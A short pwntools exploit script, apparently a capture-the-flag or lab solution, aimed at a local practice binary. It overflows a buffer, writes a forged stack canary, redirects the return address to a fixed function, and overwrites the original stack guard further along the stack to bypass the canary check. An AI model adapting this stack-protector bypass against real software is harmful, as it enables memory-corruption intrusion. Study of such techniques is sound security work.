from pwn import *

p = process("./change_origin_stack_guard")
gdb.attach(p,"set follow-fork-mode child\nb *0x0000000000400998")

context.log_level = "debug"
target = 0x000000000040090E
my_canary = 0xdeadbeefdeadbeef
p2 = "a" * 0x108 + p64(my_canary) + p64(0) + p64(target)
p2 = p2.ljust(0x8e8,"\x00")
p2 += p64(my_canary)
p.sendafter("change the origin stack guard\n",p2)
p.interactive()
